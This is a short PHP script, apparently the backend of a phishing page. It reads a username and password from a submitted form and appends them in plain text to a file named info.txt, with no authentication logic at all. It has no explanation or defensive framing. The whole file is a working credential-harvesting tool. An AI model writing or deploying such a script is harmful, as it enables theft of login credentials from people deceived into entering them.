<?php

$pm = $_POST["pm"];
$user = $_POST["username"];
$pass = $_POST["password"];


$file = 'info.txt';
$fp = fopen($file, 'a');

fwrite($fp, "user:$user pass:$pass");

fclose($fp);

?>